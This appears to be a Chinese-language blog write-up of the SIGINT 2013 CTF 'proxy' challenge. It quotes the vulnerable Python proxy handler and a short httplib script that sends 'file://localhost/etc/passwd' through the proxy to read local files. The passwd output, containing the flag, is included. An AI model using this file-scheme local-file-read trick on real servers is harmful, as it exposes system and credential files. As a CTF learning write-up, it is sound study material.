---
layout: post
title: "SIGINT 2013 misc200 proxy"
description: "SIGINT 2013 misc 200 proxy read arbitrary file"
category: "writeup"
tags: ["SIGINT 2013", "misc", "writeup"]
---
{% include JB/setup %}
#SIGINT 2013 misc200 proxy

Description                                                                                                                                                                                       

    Running on 188.40.147.125

[proxy.py](https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/misc/proxy/proxy.py)

######（这题略水）
从代码来看似乎运行着一个代理的服务。

```python
class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        print self.path, self.wfile
        logging.info(parsed_url)
        if parsed_url.netloc == "localhost":
            self.copyfile(urllib2.urlopen(self.path), self.wfile)
```

[urlparse()](http://docs.python.org/2/library/urlparse.html)
识别的是URL中`//`起到第一个`/`的部分，这部分必须`localhost`才能读取文件。
也就是只能读本地文件。

```python
import httplib

def call(x):
        host = "188.40.147.125:8080"
        c = httplib.HTTPConnection(host)
        c.request("GET", x)
        r = c.getresponse()
        print r.status
        print r.read()
        print r.getheaders()
        c.close()

if __name__ == '__main__' :
        call("http://localhost/")
        call("file://localhost/etc/passwd")
```

[go.py](https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/misc/proxy/go.py)

但是读取`http://localhost/`返回的是静态页面，没有什么信息。
那么直接读取`file://localhost/etc/passwd`呢？似乎直接得到key了。。

    ...
    challenge:x:1000:1000:SIGINT_a64428fe231bcdcabbea:/home/challenge:/bin/bash
    ...
    
FLAG is `SIGINT_a64428fe231bcdcabbea`
